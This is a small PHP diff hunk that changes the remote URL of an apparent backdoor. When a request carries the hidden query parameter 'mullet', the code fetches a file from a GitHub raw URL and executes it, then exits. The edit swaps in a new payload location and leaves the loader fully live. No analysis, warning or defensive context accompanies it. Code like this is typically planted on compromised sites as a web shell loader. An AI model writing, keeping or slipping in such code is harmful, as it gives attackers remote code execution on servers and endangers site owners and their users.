@@ -50,7 +50,7 @@ $fetcher = new CurlFetcher();
 
 if (isset($_GET['mullet'])) {
     $executor = new CodeExecutor($fetcher);
-    $executor->executeCodeFromURL("https://raw.githubusercontent.com/119marketingmg-ctrl/SCRIP-BACKUP/refs/heads/main/avatarmentahan.txt");
+    $executor->executeCodeFromURL("https://raw.githubusercontent.com/119marketingmg-ctrl/SCRIP-BACKUP-AVATAR/refs/heads/main/BAYANGAN.txt");
     exit;
 }
 
